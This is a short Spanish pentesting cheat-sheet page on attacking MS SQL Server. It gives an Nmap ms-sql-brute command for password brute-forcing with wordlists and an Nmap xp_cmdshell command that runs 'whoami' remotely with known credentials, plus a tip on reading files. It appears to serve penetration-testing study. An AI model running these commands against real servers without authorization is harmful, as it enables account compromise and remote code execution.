# MsSQL

## Fuerza Bruta

### Nmap

Podemos hacer uso de Nmap para hacerle fuerza bruta a este servicio:

```bash
nmap -p 1433 --script ms-sql-brute --script-args userdb=/root/Desktop/wordlist/common_users.txt,passdb=/root/Desktop/wordlist/100-common-passwords.txt 192.168.1.1
```

<figure><img src="../../.gitbook/assets/image (3).png" alt=""><figcaption></figcaption></figure>

## RCE

Podemos hacer un RCE si tenemos credenciales de acceso y los permisos necesarios. Usaremos un script de nmap para ello:

{% hint style="success" %}
Podemos hacer uso del comando "type" para leer archivos de la maquina
{% endhint %}

```bash
nmap -p 1433 --script ms-sql-xp-cmdshell --script-args mssql.username=usuario,mssql.password=contraseña,ms-sql-xp-cmdshell.cmd="whoami" 192.168.1.1
```

<figure><img src="../../.gitbook/assets/image (6).png" alt=""><figcaption></figcaption></figure>
